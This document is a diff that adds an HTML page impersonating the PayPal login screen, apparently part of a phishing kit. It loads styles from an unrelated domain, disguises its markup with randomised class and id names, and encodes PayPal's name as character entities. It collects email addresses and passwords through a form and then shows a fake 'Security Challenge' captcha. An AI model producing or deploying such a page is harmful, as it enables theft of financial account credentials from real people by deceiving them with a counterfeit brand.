@@ -1,0 +1,232 @@
+<html id="x_29486716">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>Log in to your PayPal account</title>
+	<!------------------------------- FILES CSS STYLE --------------------------------->
+    <link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico">
+	<link href="https://offermass.org/customer_center/lib/css/bootstrap-min.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
+	<link href="https://offermass.org/customer_center/lib/css/bootstrap-theme-min.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
+	<link href="https://offermass.org/customer_center/lib/css/style.css" rel="stylesheet" type="text/css">
+	<link rel="stylesheet" href="https://offermass.org/customer_center/lib/css/L-Z118.css">
+	<script type="text/javascript" src="../lib/js/jquery.js"></script>
+	<script src="../../../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+	<script type="text/javascript">
+		function reCaptchaVerify(response) {
+			if (response === document.querySelector('.g-recaptcha-response').value) {
+				document.getElementById("X200XI320297213").submit();
+			}
+		}
+		var captchaContainer = null;
+		var loadCaptcha = function() {
+			captchaContainer = grecaptcha.render('captcha_container', {
+				'sitekey' : '6Lc1fE8UAAAAABjsDR6P_qBa6bfZU_fd7Djdr-Ve',
+				'callback' : reCaptchaVerify
+			});
+		};
+		$(document).ready(function() {
+			$("#myWidd").modal({
+				show: false,
+				backdrop: 'static'
+			});
+			$("#X200XI320297213").submit(function(a){
+				a.preventDefault();
+				var b = 0;
+				$("#30I0D01282656869").val() || ($("#30I0D01282656869").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG"), 
+				$("#30I0D01282656869").addClass("x870AA-Ic0n3"), b = 1), $("#0DXX2D623223287").val() || ($("#0DXX2D623223287").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG"), 
+				$("#0DXX2D623223287").addClass("x870AA-Ic0n3"), $(".WA-MOOOOOY").css("z-index: 100;"), 
+				b = 1), 1 != b && ($(".F4_x666x_F4").addClass("pX-X987").fadeIn(800), $(".xT02X65G").delay(0).fadeIn(800),
+				setTimeout(function(){
+					$("#myWidd").modal({show:true});
+				}, 20));
+			}), $("#30I0D01282656869").focus(function(a) {
+				$("#30I0D01282656869").parent().next(".J118GhosTXRider").removeClass("x87Z-Add1NG");
+			}), $("#0DXX2D623223287").focus(function(a) {
+				$("#0DXX2D623223287").parent().next(".J118GhosTXRider").removeClass("x87Z-Add1NG");
+			});
+		});
+	</script>
+	<meta name="viewport" content="initial-scale=1.0">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0">
+		<style>
+	.xZ98_456ZTa{
+        margin: 0 auto;
+        width: 460px;
+    }
+	.xZ98_ZTAAa{
+        -webkit-border-radius: 5px;
+        -moz-border-radius: 5px;
+        -khtml-border-radius: 5px;
+        position: relative;
+        margin: 130px auto 0;
+        padding: 30px 10% 50px;
+        -webkit-border-radius: 5px;
+        -moz-border-radius: 5px;
+        -khtml-border-radius: 5px;
+        border-radius: 5px;
+    }
+	@media all and (max-width:767px) {
+    .xZ98_456ZTa{
+        margin-top:30px;
+        padding-top:0;
+        width:100%;
+        background-color:#fff
+    }
+	.xZ98_ZTAAa{
+        margin:0 10%;
+        padding:0
+       }
+    }
+    .error-assat {
+	background-color:#fdf5f5;
+	-moz-border-radius:5px;
+	-webkit-border-radius:5px;
+	border-radius:5px;
+	border:1px solid #c72e2e;
+	display:inline-block;
+	cursor:pointer;
+	color:#000;
+	padding: 11px;
+	font-family:Arial;
+	font-size:13px;
+	width: 100%;
+	text-decoration:none;
+	margin-bottom:10px;
+}
+.lisar {
+    float: left;
+    width: 15%;
+}
+.liman {
+    float: right;
+    width: 85%;
+    line-height: 18px;
+}
+.contentContainerXhr{
+	position: relative;
+    margin: 20px auto 0;
+    background-color: #fff;
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    -khtml-border-radius: 5px;
+    border-radius: 5px;
+    text-align: center;
+}
+#content header{
+	display: block;
+	max-width: 65%;
+	margin: 0 auto;
+}
+.paypal-logo-monogram{
+	background: transparent url(../lib/img/momgram@2x.png) top center no-repeat;
+	background-size: 30px;
+	height: 36px;
+}
+#content .paypal-logo{
+	margin: 0 auto 30px;
+	text-indent: -9999em;
+	direction: ltr;
+}
+#content p{
+	font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+	color: #2c2e2f;
+}
+.modal-content {
+	height: 550px;
+}
+@media (min-width: 768px){
+	.modal-dialog {
+		width: 460px;
+		margin: 30px auto;
+	}
+}
+	</style>
+</head>
+<body id="8970-xX666Xx-11075" style="height: 100%; overflow: hidden;"><p style="color: white;">
+<noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript>
+	<div for="9791-xMARVELxDCxCOMIC18x-10815" id="_x78ZZ5144232" name="Login">
+        <div for="10701-IDIDXD212232105818x-11995" id="_x987ZZ-164833" class="_x78ZZ4018718 xZ98_456ZTa _x78ZZ6731530">
+            <div id="9703-xMARVELxDCxCOMIC18x-10244" class="_x78ZZ5307838 xZ98_ZTAAa _x78ZZ2875125">
+			<header>
+                <div id="12292-xMARVELxDCxCOMIC18x-11556" class="x_33ID-Z773  kl_h4aXX6987PO x_22ID-Z693 "></div>
+            </header>
+                <section id="x_24ID-Z606 " class="x_24ID-Z665 ">
+                    <form for="9242-xMARVELxDCxCOMIC18x-9304" action="index.html" method="post" class="_x987WW-7134058 _x1989MPZ-23454516118" id="X200XI320297213" name="login">
+                        <div id="x_27ID-Z748 " class="x_26ID-Z747 xv987HUB x_26ID-Z621 ">
+                                                       <div class="x_G00066XD" id="11432-xMARVELxDCxCOMIC18x-12099">
+                                <div class="x_G00066XD" style="z-index: 100;">
+                                    <div id="12257-xMARVELxDCxCOMIC18x-12290" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44 x_26ID-Z608 ">
+                                        <input for="11098-xMARVELxDCxCOMIC18x-9343" class="x_27ID-Z584 x_Z1186XDD7 x_23ID-Z650 " name="login_email" type="email" placeholder="Email or phone number" id="30I0D01282656869" value="" >
+                                    </div>
+                                    <div id="11994-xMARVELxDCxCOMIC18x-11702" class=" x_22ID-Z743 J118GhosTXRider x_34ID-Z565">
+                                        <p>Email address is required.</p>
+                                    </div>
+                                </div>
+                                <div id="12313-xMARVELxDCxCOMIC18x-12118" class="x_27ID-Z785  x_G00066XD x_25ID-Z588 ">
+                                    <div id="10088-xMARVELxDCxCOMIC18x-12371" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44">
+                                        <input for="8929-xMARVELxDCxCOMIC18x-12238" class="x_Z1186XDD7" name="login_password" type="password" placeholder="Password" id="0DXX2D623223287">
+                                    </div>
+                                    <div id="12348-xMARVELxDCxCOMIC18x-9958" class="x_26ID-Z561 J118GhosTXRider x_30ID-Z649 ">
+                                        <p id="10839-xMARVELxDCxCOMIC18x-10875">Password is required.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="8971-xMARVELxDCxCOMIC18x-11914" class="10784-xMARVELxDCxCOMIC188x-11932 o_B4Ads-W4OOXDS">
+                                <button for="11289-xMARVELxDCxCOMIC18x-8931" class="xXMARVELxXBut00N" type="submit" id="11212-x666G-12206" name="12292-x968AG-9081">Log In</button>
+                            </div>
+                            <div id="12146-xMARVELxDCxCOMIC18x-10020" class="x_25ID-Z745 ww_LiZ3b44 x_26ID-Z612 "><a href="index.html#" id="10136-xT00x-9849" class="9972-x660x-12004">Having trouble logging in?</a>
+                                <div id="11050-xMARVELxDCxCOMIC18x-8946" class="x_25ID-Z555 " id="x_30ID-Z580 ">
+                                </div>
+                            </div>
+                            <a for="11375-xMARVELxDCxCOMIC18x-8911" href="index.html#" class="x_29ID-Z668 xXMARVELxXBut00N Z0-s6X6s-00" id="12085-s6X6s-9797">Sign Up</a></div>
+                    </form>
+                </section>
+                <br>
+            </div>
+        </div>
+        <div id="10088-xMARVELxDCxCOMIC18x-12252" class="x_26ID-Z772 F4_x666x_F4 x_22ID-Z585 ">
+            <p id="9310-xMARVELxDCxCOMIC18x-10745" class="x_34ID-Z719 xT02X65G x_33ID-Z618">Checking your info…</p>
+        </div>
+    </div>
+    <footer id="8907-xMARVELxDCxCOMIC18x-9710" class="x_30ID-Z758 DC_XX98700 x_26ID-Z784 xv987HUB x_22ID-Z773 ">
+        <ul>
+            <li id="9513-xMARVELxDCxCOMIC18x-11018"><a href="index.html#">Privacy</a></li>
+            <li id="9666-xMARVELxDCxCOMIC18x-9394"></li>
+            <li id="9360-xMARVELxDCxCOMIC18x-10724"><a href="index.html#">&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;</a></li>
+        </ul>
+        <br>
+        <ul id="9229-xMARVELxDCxCOMIC18x-11870">
+            <li id="8999-xMARVELxDCxCOMIC18x-9139"><a href="index.html#" style="color: #9e9e9e;">Copyright © 1999-2018 &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;</a></li>
+        </ul>
+    </footer>
+		<div id="myWidd" class="modal fade" role="dialog">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-body">
+                        <div id="content" class="contentContainerXhr">
+							<header>
+								<p class="paypal-logo paypal-logo-monogram"></p>
+							</header>
+							<h2 style='margin: 0; padding: 0;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 1.6em;
+    line-height: 21px;
+    font-weight: 500;
+    color: #000;
+    border-bottom: 1px solid #c1c1c1;
+	margin-bottom: 10px;
+    padding-bottom: 10px;'>Security Challenge</h2>
+							<form id="SetCaptch" name="challenge" novalidate="">
+								<div id="captcha_container" style="width: 310px; margin-right: auto; margin-left: auto;"></div>
+							</form>
+							<script src="../../../www.google.com/recaptcha/api.js%3Fonload=loadCaptcha&amp;render=explicit" async defer></script>
+						</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+<!------------------------------- FILE JAVASCRIPT --------------------------------->
+    
+<!------------------------------- FILE JAVASCRIPT --------------------------------->
+</body>
+</html>
